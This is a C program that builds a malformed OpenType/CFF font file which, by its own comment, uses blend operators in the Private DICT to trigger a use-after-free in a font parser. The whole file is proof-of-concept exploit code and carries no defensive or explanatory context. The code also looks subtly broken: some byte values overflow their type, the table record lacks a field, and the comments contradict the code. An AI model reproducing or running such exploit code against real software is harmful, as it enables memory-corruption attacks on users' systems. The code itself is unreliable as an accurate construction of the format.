#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xFF, f);
    fputc((v >> 16) & 0xFF, f);
    fputc((v >> 8) & 0xFF, f);
    fputc(v & 0xFF, f);
}

static void write_cff_byte_int(FILE *f, uint8_t v) {
    fputc(v + 139, f);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* OpenType header */
    write_uint32(f, 0x4F54544F); /* 'OTTO' */
    write_uint16(f, 1);
    write_uint16(f, 16);
    write_uint16(f, 0);
    write_uint16(f, 0);

    /* Table record for 'CFF ' (CFF1) */
    write_uint32(f, 0x43464620); /* 'CFF ' */
    long table_offset_pos = ftell(f);
    write_uint32(f, 0);
    write_uint32(f, 0);
    long table_start = ftell(f);

    /* CFF1 Header: 4 bytes */
    fputc(0x01, f); /* major = 1 */
    fputc(0x00, f); /* minor = 0 */
    fputc(0x04, f); /* hdrSize = 4 */
    fputc(0x00, f); /* offSize = 0 (will be determined by INDEX sizes, but we set to 1 for simplicity) */

    /* Name INDEX (empty) */
    write_uint16(f, 0); /* count = 0 */

    /* Top DICT INDEX */
    write_uint16(f, 1); /* count = 1 */
    fputc(0x01, f);     /* offSize = 1 */
    fputc(0x01, f);     /* offset[0] = 1 */
    fputc(0x09, f);     /* offset[1] = 9 (8 bytes of top dict data) */

    /* Top DICT data */
    /* Just CharStrings operator pointing to empty INDEX */
    write_cff_byte_int(f, 0);
    fputc(0x11, f); /* CharStrings */
    /* Private DICT operator: <size> <offset> */
    long private_size_pos = ftell(f);
    write_cff_byte_int(f, 0); /* size placeholder */
    long private_offset_pos = ftell(f);
    write_cff_byte_int(f, 0); /* offset placeholder */
    fputc(0x12, f); /* Private operator */

    /* String INDEX (empty) */
    write_uint16(f, 0);

    /* Global Subr INDEX (empty) */
    write_uint16(f, 0);

    /* ---- Private DICT ---- */
    long private_start = ftell(f);
    /* Push values for blend (CFF1 blend expects: numBlends, then for each blend: value + delta pair) */
    /* Actually, in CFF1, blend operator (0x0C 0x1A) expects numBlends on stack, then 5*numBlends values */
    /* For CFF1, the blend operator uses the same format as CFF2 but with different operator code */
    /* We'll push numBlends=1, then 5 values */
    write_cff_byte_int(f, 1);   /* numBlends */
    write_cff_byte_int(f, 100); /* value */
    write_cff_byte_int(f, 200);
    write_cff_byte_int(f, 300);
    write_cff_byte_int(f, 400);
    write_cff_byte_int(f, 500);
    fputc(0x0C, f); fputc(0x1A, f); /* blend operator */
    /* Second blend */
    write_cff_byte_int(f, 1);
    write_cff_byte_int(f, 600);
    write_cff_byte_int(f, 700);
    write_cff_byte_int(f, 800);
    write_cff_byte_int(f, 900);
    write_cff_byte_int(f, 1000);
    fputc(0x0C, f); fputc(0x1A, f);
    /* Push integer to trigger use-after-free */
    write_cff_byte_int(f, 0);
    long private_end = ftell(f);
    uint32_t private_len = private_end - private_start;
    uint32_t private_offset = private_start - table_start;

    /* Patch Private DICT size and offset in Top DICT */
    fseek(f, private_size_pos, SEEK_SET);
    if (private_len < 108) {
        fputc(private_len + 139, f);
    } else {
        fputc(0x1C, f);
        fputc((private_len >> 8) & 0xFF, f);
        fputc(private_len & 0xFF, f);
    }
    fseek(f, private_offset_pos, SEEK_SET);
    if (private_offset < 108) {
        fputc(private_offset + 139, f);
    } else {
        fputc(0x1C, f);
        fputc((private_offset >> 8) & 0xFF, f);
        fputc(private_offset & 0xFF, f);
    }
    fseek(f, private_end, SEEK_SET);

    /* CharStrings INDEX (empty) */
    write_uint16(f, 0);

    /* ---- VariationStore (dummy, required for blend) ---- */
    long vstore_start = ftell(f);
    /* Minimal VariationStore with 1 region */
    write_uint16(f, 1);          /* version */
    write_uint16(f, 8);          /* offset to VarRegionList = 8 */
    write_uint16(f, 1);          /* dataCount = 1 */
    write_uint16(f, 14);         /* offset to ItemVarData = 14 */

    /* VarRegionList header (starts at vstore_start + 8 = here) */
    write_uint16(f, 1);          /* axisCount */
    write_uint16(f, 1);          /* regionCount */
    write_uint16(f, 0);          /* axisIndex */
    write_uint16(f, 0);          /* startCoord */
    write_uint16(f, 16384);      /* peakCoord */
    write_uint16(f, 16384);      /* endCoord */

    /* ItemVarData (starts at vstore_start + 14 = here) */
    write_uint16(f, 1);          /* itemCount */
    write_uint16(f, 0);          /* wordDeltaCount */
    write_uint16(f, 1);          /* regionIndexCount */
    write_uint16(f, 0);          /* regionIndex */
    fputc(0, f);                 /* delta (int8) */

    long table_end = ftell(f);
    uint32_t table_length = table_end - table_start;

    fseek(f, table_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)table_start);
    write_uint32(f, table_length);

    fclose(f);
    return 0;
}